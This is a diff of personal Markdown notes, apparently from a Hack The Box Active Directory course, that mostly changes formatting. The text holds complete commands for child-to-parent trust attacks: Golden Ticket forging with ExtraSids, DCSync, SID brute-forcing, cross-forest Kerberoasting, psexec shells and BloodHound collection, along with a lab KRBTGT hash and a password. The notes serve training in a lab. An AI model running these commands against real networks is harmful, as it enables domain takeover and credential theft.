@@ -1674,17 +1562,17 @@ CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880
 
 At this point, we have gathered the following data points:
 
-- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
-- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
-- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
-- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
-- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
+* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
+* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
+* The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
+* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
+* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
 
 Currently we donot have access
 
-- `PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`
+* `PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`
 
-### **Creating a Golden Ticket with Mimikatz**
+#### **Creating a Golden Ticket with Mimikatz**
 
 ```powershell
 PS C:\htb> mimikatz.exe
@@ -1712,16 +1600,16 @@ Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitte
 
 we can confirm a kerberos ticket is in memory using `klist` command
 
-Now running this  command,  we have access.`PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`
+Now running this command, we have access.`PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`
 
-- `ls \\academy-ea-dc01.inlanefreight.local\c$` → listing the entire C: Drive of the Domain Controller
+* `ls \\academy-ea-dc01.inlanefreight.local\c$` → listing the entire C: Drive of the Domain Controller
 
-# **ExtraSids Attack - Rubeus**
+## **ExtraSids Attack - Rubeus**
 
-- `PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` →creating golden ticket using Rubeus
-- `klist` to confirm ticket is in Memory
+* `PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` →creating golden ticket using Rubeus
+* `klist` to confirm ticket is in Memory
 
-## **Performing a DCSync Attack against `lab_adm` domain user**
+### **Performing a DCSync Attack against `lab_adm` domain user**
 
 ```powershell
 PS C:\Tools\mimikatz\x64> .\mimikatz.exe
@@ -1761,30 +1649,29 @@ When dealing with multiple domains and our target domain is not the same as the 
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
 
-# **Attacking Domain Trusts - Child -> Parent Trusts - from Linux**
+## **Attacking Domain Trusts - Child -> Parent Trusts - from Linux**
 
-### **Performing DCSync with secretsdump.py**
+#### **Performing DCSync with secretsdump.py**
 
 ```
 dollarboysushil@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 ```
 
-### **Performing SID Brute Forcing using lookupsid.py**
+#### **Performing SID Brute Forcing using lookupsid.py**
 
-- `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
-- `dollarboysushil@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` → filtering out just the DOMAIN SID
+* `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
+* `dollarboysushil@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` → filtering out just the DOMAIN SID
 
-### **Grabbing the Domain SID & Attaching to Enterprise Admin's RID**
+#### **Grabbing the Domain SID & Attaching to Enterprise Admin's RID**
 
-- `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
+* `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
+* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f` → from DCSync using secretsdump.py
+* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689` → from lookupsid.py
+* The name of a target user in the child domain (does not need to exist!): `hacker`
+* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
+* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`→ from lookupsid.py
 
-- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f` → from DCSync using secretsdump.py
-- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689` → from lookupsid.py
-- The name of a target user in the child domain (does not need to exist!): `hacker`
-- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
-- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`→ from lookupsid.py
-
-# **Constructing a Golden Ticket using ticketer.py**
+## **Constructing a Golden Ticket using ticketer.py**
 
 ```
 dollarboysushil@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
@@ -1807,18 +1694,18 @@ Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corpo
 
 ticket will be saved in .ccache, we have to setup a `KRB5CCNAME` Environment Variable
 
-- `export KRB5CCNAME=hacker.ccache`
-- `dollarboysushil@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` → getting System shell using impacket’s psexec
+* `export KRB5CCNAME=hacker.ccache`
+* `dollarboysushil@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` → getting System shell using impacket’s psexec
 
-Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain.
+Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain.
 
-- `dollarboysushil@htb[/htb]**$** raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
+* `dollarboysushil@htb[/htb]**$** raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
 
-# **Breaking Down Boundaries**
+## **Breaking Down Boundaries**
 
-# **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows**
+## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows**
 
-### **Enumerating Accounts for Associated SPNs Using Get-DomainUser Using Power view**
+#### **Enumerating Accounts for Associated SPNs Using Get-DomainUser Using Power view**
 
 ```powershell
 PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
@@ -1839,27 +1726,26 @@ samaccountname memberof
 mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
 ```
 
-Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.
+Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.
 
-- `PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
+* `PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
 
-# **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux**
+## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux**
 
 Getting the SPNs
 
-- `dollarboysushil@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
-- `dollarboysushil@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` → specifying -request flag gives us the ricket.
+* `dollarboysushil@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
+* `dollarboysushil@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` → specifying -request flag gives us the ricket.
 
-# **Hunting Foreign Group Membership with Bloodhound-python**
+## **Hunting Foreign Group Membership with Bloodhound-python**
 
-- `dollarboysushil@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` → for inlanefreight.local
-    
+*   `dollarboysushil@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` → for inlanefreight.local
+
     we can then compress the result into zip file
-    
+
     `zip -r ilfreight_bh.zip *.json`
-    
-- `dollarboysushil@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2` → for freightlogistics.local
+* `dollarboysushil@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2` → for freightlogistics.local
 
-### **Viewing Dangerous Rights through BloodHound**
+#### **Viewing Dangerous Rights through BloodHound**
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2017.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 17.png>)
